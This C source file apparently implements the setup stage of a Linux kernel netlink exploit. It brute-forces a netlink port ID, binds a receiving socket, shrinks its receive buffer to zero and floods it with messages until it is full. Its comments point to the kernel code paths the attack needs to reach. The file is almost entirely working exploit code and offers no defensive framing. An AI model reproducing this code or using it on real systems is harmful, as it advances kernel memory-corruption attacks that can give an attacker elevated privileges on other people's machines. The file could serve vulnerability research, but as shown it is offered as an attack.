#include <pthread.h>
#include <sys/socket.h>
#include <assert.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <asm/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int flood() {

    int send_fd, recv_fd;

    int ret;
    //(sk->sk_sndbuf - 32)
    char buf[1024];
    int new_size = 0;


    send_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
    assert(send_fd > 0);

    recv_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
    assert(recv_fd > 0);

    struct sockaddr_nl addr = {
        //if (addr->nl_family != AF_NETLINK)
        .nl_family = AF_NETLINK,

        // To make it unicast, we need it to achieve netlink_attachskb
        .nl_groups = 0,
        
        // We will bruteforce this.
        .nl_pid = 100,

        .nl_pad = 0,
    };

    struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf),
    };

    struct msghdr msghdr = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,

        .msg_control = NULL,
        
        //if (msg->msg_controllen <= 0)
        //return 0; <- we need this
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    /* 
    struct sockaddr_in address;
    address.sin_family = AF_NETLINK;
    address.sin_port = htons(3334);
    */

    while(bind(recv_fd, (struct sockaddr *)&addr, sizeof(addr))) {
        if(errno != EADDRINUSE) {
            printf("bind: failed!");
            return -1;
        }

        addr.nl_pid++;
    }
    
    ret = setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, 
                sizeof(new_size));

    if(ret != 0) {
        printf("setsockopt failed but that's ok!\n");
    }

    while(sendmsg(send_fd, &msghdr, MSG_DONTWAIT) > 0) {
        printf("Sending msg...\n");
    }

    if (errno != EAGAIN) {
        printf("sendmsg: We didn't make it...\n");
        return -1;

    }
    
    printf("The receive buffer is full!\n");
    close(send_fd);
    return recv_fd;
}

int main() {
    flood();
    return 0;
}
